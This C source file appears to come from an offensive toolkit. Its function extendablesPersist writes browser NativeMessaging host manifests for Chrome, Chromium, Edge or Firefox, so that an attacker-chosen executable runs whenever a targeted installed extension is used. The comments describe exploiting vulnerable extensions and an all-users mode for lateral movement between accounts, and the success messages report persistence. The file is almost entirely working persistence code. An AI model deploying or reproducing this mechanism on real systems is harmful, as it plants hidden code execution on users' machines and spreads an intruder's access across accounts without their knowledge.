#include "extendables.h"

/*
If a vulnerable browser extension exists on the system, this function can be
used to execute code when the browser is launched/a specific action in the
browser is performed.

Options are also present, if you are an admin, to add the functionality to all
users on the system for lateral movement between logged on accounts (if they
also have the extension installed).

REQUIRED:
extensionId - identifier string for the extension, eg.
aeblfdkhhhdcdjpifhhbdiojplfjncoa extensionName - internal name of the extension,
eg. com.1password.1password targetPath - Path of exe or file with default app
mapped, to run

OPTIONAL:
browser - browser to target: chrome, chromium, edge, firefox (all must be
lowercase), default - chrome allUsers - Install for a specific user or all
users. <USERNAME> = specified user (case sensitive), user = current user,
machine = all users (only works if admin). Default = machine decription -
Description of extension in native.json (doesn't really impact anything),
default - 'This is an extension that extends browser functionality'

*/
void extendablesPersist(char *extensionId, char *extensionName,
                        char *targetPath, char *browser, char *allUsers,
                        char *description, int verbose) {

  // Set up variables and default values
  char *filePath = (char *)"";
  FILE *manifest;

  char *chromeNMCUPath =
      (char *)calloc(1, 48 + strlen(getenv("HOME")) + strlen(allUsers) + 5);
  char *edgeNMCUPath =
      (char *)calloc(1, 49 + strlen(getenv("HOME")) + strlen(allUsers) + 5);
  char *firefoxExtensionPath =
      (char *)calloc(1, 36 + strlen(getenv("HOME")) + strlen(allUsers) + 5);
  char *chromiumNMCUPath =
      (char *)calloc(1, 48 + strlen(getenv("HOME")) + strlen(allUsers) + 5);

  // Set path depending on if user specified is current user or custom
  if (strcmp(allUsers, "user") == 0) {
    sprintf(chromeNMCUPath, "%s/.config/google-chrome/NativeMessagingHosts/",
            getenv("HOME"));
    sprintf(edgeNMCUPath, "%s/.config/microsoft-edge/NativeMessagingHosts/",
            getenv("HOME"));
    sprintf(firefoxExtensionPath, "%s/.mozilla/native-messaging-hosts/",
            getenv("HOME"));
    sprintf(chromiumNMCUPath, "%s/.config/chromium/NativeMessagingHosts/",
            getenv("HOME"));
  } else {
    sprintf(chromeNMCUPath,
            "/home/%s/.config/google-chrome/NativeMessagingHosts/", allUsers);
    sprintf(edgeNMCUPath,
            "/home/%s/.config/microsoft-edge/NativeMessagingHosts/", allUsers);
    sprintf(firefoxExtensionPath, "/home/%s/.mozilla/native-messaging-hosts/",
            allUsers);
    sprintf(chromiumNMCUPath, "/home/%s/.config/chromium/NativeMessagingHosts/",
            allUsers);
  }

  // Handle inputs mising
  if (strcmp(extensionId, "") == 0) {
    printf("Please specify the extensionId of the extension to exploit\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    return;
  }

  if (strcmp(extensionName, "") == 0) {
    printf("Please specify the extensionName of the extension to exploit\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    return;
  }

  if (strcmp(targetPath, "") == 0) {
    printf("Please specify the path to your target which will be persisted\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    return;
  }

  // Set the correct file location depending on browser specified
  if (strcmp(browser, "chrome") == 0) {
    // Set whether to use the NativeMessaging Application for all users or just
    // the current user
    if (strcmp(allUsers, "machine") == 0) {
      filePath = (char *)"/etc/opt/chrome/native-messaging-hosts/";
    } else {
      filePath = chromeNMCUPath;
    }

  } else if (strcmp(browser, "chromium") == 0) {
    // Set whether to use the NativeMessaging Application for all users or just
    // the current user
    if (strcmp(allUsers, "machine") == 0) {
      filePath = (char *)"/etc/opt/chromium/native-messaging-hosts/";
    } else {
      filePath = chromiumNMCUPath;
    }
  } else if (strcmp(browser, "edge") == 0) {
    // Set whether to use the NativeMessaging Application for all users or just
    // the current user
    if (strcmp(allUsers, "machine") == 0) {
      filePath = (char *)"/etc/opt/edge/native-messaging-hosts/";
    } else {
      filePath = edgeNMCUPath;
    }
  } else if (strcmp(browser, "firefox") == 0) {
    // Set whether to use the NativeMessaging Application for all users or just
    // the current user
    if (strcmp(allUsers, "machine") == 0) {
      filePath = (char *)"/usr/lib/mozilla/native-messaging-hosts/";
    } else {
      filePath = firefoxExtensionPath;
    }
  } else {
    printf("Browser not recognised! Use - Chrome, Edge or Firefox\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    return;
  }

  // Create the full file path with the extension
  char *fullPath = (char *)calloc(1, 255);
  strcat(fullPath, filePath);

  // Length checking of extensionID
  int extLen = strlen(extensionId);
  if (extLen > 32) {
    printf("ExtensionID was too long!\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    return;
  }

  // Build up file path
  strcat(fullPath, extensionName);
  strcat(fullPath, ".json");

  // Write the full content of the native.json file
  char *nativeContent = (char *)calloc(1, 1000);
  strcat(nativeContent, "{\n  \"name\": \"");
  if (strlen(nativeContent) > 50) {
    printf("Extension name is too long (>50 characters)\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    free(nativeContent);
    return;
  }
  strcat(nativeContent, extensionName);
  strcat(nativeContent, "\",\n  \"description\": \"");
  if (strlen(description) > 100) {
    printf("Description is too long (>100 characters)\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    free(nativeContent);
    return;
  }
  strcat(nativeContent, description);
  strcat(nativeContent, "\",\n  \"path\": \"");
  if (strlen(targetPath) > 255) {
    printf("Target path is too long (>255 characters)\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    free(nativeContent);
    return;
  }
  strcat(nativeContent, targetPath);
  // Set protocol schema for specific browser in native.json
  if (strcmp(browser, "chrome") == 0 || (strcmp(browser, "edge") == 0) ||
      (strcmp(browser, "chromium") == 0)) {
    strcat(nativeContent, "\",\n  \"type\": \"stdio\",\n  \"allowed_origins\": "
                          "[\"chrome-extension://");
  } else if (strcmp(browser, "firefox") == 0) {
    strcat(nativeContent,
           "\",\n  \"type\": \"stdio\",\n  \"allowed_extensions\": [\"");
  }
  if (strlen(extensionId) > 40) {
    printf("Extension ID is too long (>40 characters)\n");
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    free(nativeContent);
    return;
  }
  strcat(nativeContent, extensionId);
  if (strcmp(browser, "firefox") == 0) {
    strcat(nativeContent, "\"]\n}");
  } else {
    strcat(nativeContent, "/\"]\n}");
  }

  // Write the content to the file
  manifest = fopen(fullPath, "w");
  if (manifest == NULL) {
    printf("Error opening - %s, are you sure you have the permissions?\n\n",
           fullPath);
    // Free buffers
    free(chromeNMCUPath);
    free(edgeNMCUPath);
    free(firefoxExtensionPath);
    free(chromiumNMCUPath);
    free(fullPath);
    free(nativeContent);
    return;
  }
  fprintf(manifest, "%s", nativeContent);
  fclose(manifest);

  printf("[*] NativeMessaging manifest written to - %s!\n", fullPath);

  // Select success message based on parameters
  if (strcmp(allUsers, "user") == 0) {
    printf("[*] Successfully persisted in the extension - %s for the current "
           "user on %s!\n",
           extensionName, browser);
  } else if (strcmp(allUsers, "machine") == 0) {
    printf("[*] Successfully persisted in the extension - %s for all users on "
           "%s!\n",
           extensionName, browser);
  } else {
    printf("[*] Successfully persisted in the extension - %s for the user '%s' "
           "on %s!\n",
           extensionName, allUsers, browser);
  }

  // Free buffers
  free(chromeNMCUPath);
  free(edgeNMCUPath);
  free(firefoxExtensionPath);
  free(chromiumNMCUPath);
  free(fullPath);
  free(nativeContent);

  return;
}